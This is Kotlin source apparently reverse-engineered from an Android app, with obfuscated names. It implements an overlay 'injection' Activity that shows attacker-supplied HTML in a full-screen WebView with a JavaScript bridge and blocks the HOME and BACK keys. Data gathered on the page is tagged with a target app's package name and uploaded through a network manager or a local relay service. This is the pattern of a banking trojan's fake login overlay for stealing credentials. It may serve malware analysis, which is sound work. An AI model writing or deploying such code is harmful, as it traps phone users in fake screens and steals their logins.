package com.storm.safe.rock.inject

import android.app.Activity
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.view.KeyEvent
import android.view.ViewGroup
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebStorage
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.NetworkManager
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

/**
 * WebView injection Activity — loads HTML content and provides a JavaScript bridge.
 * Sends injection data via NetworkManager or falls back to local-service HTTP.
 *
 * Reverse-engineered from JADX: inject/jbqfkndyx.java (238 lines) +
 * inject/jbqfkndyx$sendInjectionData$1.java (196 lines).
 * Inner coroutine class merged into parent as suspendable function.
 *
 * Renamed: f51944a4→Companion, f51945a5→active, f51946a6→inForeground,
 *          f51947a7→currentInstance, f51948a0→webView, f51949a1→targetPackageName,
 *          m211201a0→sendInjectionData
 */
class jbqfkndyx : Activity() {

    companion object {
        private const val TAG = "jbqfkndyx"

        @Volatile
        @JvmStatic
        var active: Boolean = false

        @Volatile
        @JvmStatic
        var inForeground: Boolean = false

        @Volatile
        @JvmStatic
        var currentInstance: jbqfkndyx? = null

        /**
         * Close the currently active injection activity.
         */
        @JvmStatic
        fun finishCurrent() {
            val inst = currentInstance ?: return
            inst.runOnUiThread { inst.finishAndRemoveTask() }
        }

        /**
         * Close the injection activity only if it's targeting the given package.
         */
        @JvmStatic
        fun finishForPackage(packageName: String) {
            val inst = currentInstance ?: return
            if (inst.targetPackageName == packageName) {
                inst.runOnUiThread { inst.finishAndRemoveTask() }
            }
        }
    }

    var webView: WebView? = null
    var targetPackageName: String = ""
    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Send injection data via NetworkManager, fallback to local-service HTTP.
     * Merged from inner coroutine class jbqfkndyx$sendInjectionData$1.
     */
    fun sendInjectionData(data: String) {
        try {
            if (data.isEmpty()) {
                Log.w(TAG, "⚠️ 数据为空，不发送")
                return
            }
            val json = JSONObject().apply {
                put("packageName", targetPackageName)
                put("type", "injection")
                put("data", data)
                put("timestamp", System.currentTimeMillis())
            }
            coroutineScope.launch {
                var networkManagerSuccess = false
                try {
                    val svc = MyAccessibilityService.Companion.getInstance()
                    val nm = svc?.getNetworkManager()
                    if (nm != null) {
                        nm.sendData(json)
                        // ADAPT: depends on NetworkManager.sendData suspend call
                        Log.d(TAG, "✅ 注入数据已通过 NetworkManager 上传成功")
                        // Notify local-service to remove injection task
                        try {
                            val removeUrl = URL("http://127.0.0.1:7912/removeInjectionTask?packageName=$targetPackageName")
                            val conn = removeUrl.openConnection() as HttpURLConnection
                            conn.connectTimeout = 3000
                            conn.readTimeout = 3000
                            conn.requestMethod = "GET"
                            conn.responseCode
                            conn.disconnect()
                            Log.d(TAG, "✅ 已通知 local-service 删除注入任务: $targetPackageName")
                        } catch (e: Exception) {
                            Log.w(TAG, "⚠️ 通知 local-service 删除任务失败: ${e.message}")
                        }
                        networkManagerSuccess = true
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "⚠️ NetworkManager 上传失败: ${e.message}")
                }

                if (!networkManagerSuccess) {
                    // Fallback to local-service HTTP POST
                    try {
                        Log.d(TAG, "📤 尝试通过 local-service 转发上传...")
                        val conn = URL("http://127.0.0.1:7912/injectionData").openConnection() as HttpURLConnection
                        conn.connectTimeout = 5000
                        conn.readTimeout = 10000
                        conn.requestMethod = "POST"
                        conn.setRequestProperty("Content-Type", "application/json")
                        conn.doOutput = true
                        val output = conn.outputStream
                        output.write(json.toString().toByteArray(Charsets.UTF_8))
                        output.close()
                        val responseCode = conn.responseCode
                        val responseBody = try {
                            BufferedReader(InputStreamReader(conn.inputStream, Charsets.UTF_8)).readText()
                        } catch (_: Exception) {
                            ""
                        }
                        conn.disconnect()
                        if (responseCode == 200 && responseBody.contains("\"success\":true")) {
                            Log.d(TAG, "✅ 注入数据已通过 local-service 转发成功")
                        } else {
                            Log.e(TAG, "❌ local-service 转发失败: HTTP $responseCode → $responseBody")
                            networkManagerSuccess = false
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "❌ local-service 转发异常: ${e.message}")
                    }
                }

                if (!networkManagerSuccess) {
                    Log.e(TAG, "❌ 两个通道都失败，注入数据未能上传（任务保留，下次继续）")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 发送注入数据失败", e)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        currentInstance = this
        targetPackageName = intent.getStringExtra("package_name") ?: ""
        val htmlFile = intent.getStringExtra("html_file") ?: ""
        var htmlContent = intent.getStringExtra("html_content") ?: ""

        if (htmlContent.isEmpty() && htmlFile.isNotEmpty()) {
            try {
                htmlContent = File(htmlFile).readText()
                Log.d(TAG, "✅ 从文件加载HTML: $htmlFile (${htmlContent.length}字节)")
            } catch (e: Exception) {
                Log.e(TAG, "❌ 读取HTML文件失败: $htmlFile", e)
            }
        }

        if (htmlContent.isEmpty()) {
            Log.e(TAG, "❌ HTML内容为空，关闭Activity")
            finishAndRemoveTask()
            return
        }

        try {
            val wv = WebView(this)
            @Suppress("SetJavaScriptEnabled")
            wv.settings.javaScriptEnabled = true
            wv.scrollBarStyle = 0
            wv.webViewClient = WebViewClient()
            wv.webChromeClient = WebChromeClient()
            // JADX: mk1 (WebViewJsBridge) — JS bridge for injection data
            wv.addJavascriptInterface(com.storm.safe.rock.p000.WebViewJsBridge(this), "Android")

            // Handle base64-encoded HTML
            if (htmlContent.startsWith("data:text/html;base64,")) {
                val base64 = htmlContent.substring(22)
                val decoded = Base64.decode(base64, Base64.DEFAULT)
                htmlContent = String(decoded, Charsets.UTF_8)
            }

            wv.loadDataWithBaseURL(null, htmlContent, "text/html", "UTF-8", null)
            webView = wv
            setContentView(wv)
            active = true
            inForeground = true
        } catch (e: Exception) {
            Log.e(TAG, "❌ 创建HTML注入Activity失败", e)
            finishAndRemoveTask()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        active = false
        inForeground = false
        coroutineScope.cancel()
        if (currentInstance === this) {
            currentInstance = null
        }
        try {
            webView?.let { wv ->
                (wv.parent as? ViewGroup)?.removeView(wv)
                WebStorage.getInstance().deleteAllData()
                wv.destroy()
            }
            webView = null
        } catch (e: Exception) {
            Log.e(TAG, "❌ 销毁HTML注入Activity失败", e)
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        // Block HOME(3) and BACK(4) keys
        if (keyCode == 3 || keyCode == 4) return true
        return super.onKeyDown(keyCode, event)
    }

    override fun onPause() {
        super.onPause()
        inForeground = false
    }

    override fun onResume() {
        super.onResume()
        inForeground = true
    }
}
